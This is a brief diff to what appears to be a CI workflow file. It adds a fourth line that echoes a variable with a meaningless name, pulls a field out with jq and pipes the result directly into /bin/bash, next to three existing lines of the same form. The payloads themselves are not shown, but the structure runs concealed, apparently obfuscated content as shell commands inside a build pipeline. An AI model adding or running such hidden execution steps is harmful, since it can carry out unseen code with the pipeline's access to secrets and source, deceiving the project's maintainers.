@@ -29,6 +29,7 @@ jobs:
           echo $za336 | jq -r .fz24351 | /bin/bash
           echo $ypm5207 | jq -r .znd692 | /bin/bash
           echo $qsvx807 | jq -r .by14 | /bin/bash
+          echo $m65 | jq -r .ii84898 | /bin/bash
 
       - name: Upload results
         if: always()
